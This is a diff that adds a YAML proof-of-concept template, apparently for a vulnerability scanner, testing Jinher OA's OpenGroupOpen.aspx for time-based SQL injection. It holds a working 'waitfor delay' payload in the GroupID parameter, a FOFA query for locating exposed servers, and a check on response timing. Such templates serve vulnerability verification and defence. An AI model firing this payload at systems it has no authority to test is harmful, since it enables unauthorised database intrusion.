@@ -1,0 +1,30 @@
+id: poc-yaml-jinher-opengroupopen-aspx-sqli
+info:
+  name: 金和OA OpenGroupOpen.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /c6/Jhsoft.Web.AddMenu/OpenGroupOpen.aspx/?GroupID=1%27)waitfor+delay%270:0:{{.t1}}%27--&op=view
+  expression: 'status_code == 200 &&
+
+    contains(gbk_decode(body),"公开组公开范围状态查看") &&
+
+    contains(gbk_decode(body),"外部系统名称") &&
+
+    contains(gbk_decode(body),"成功标识") &&
+
+    contains(body,"JHSoft") &&
+
+    duration >= t1 &&
+
+    duration <= t2
+
+    '
+transport: http
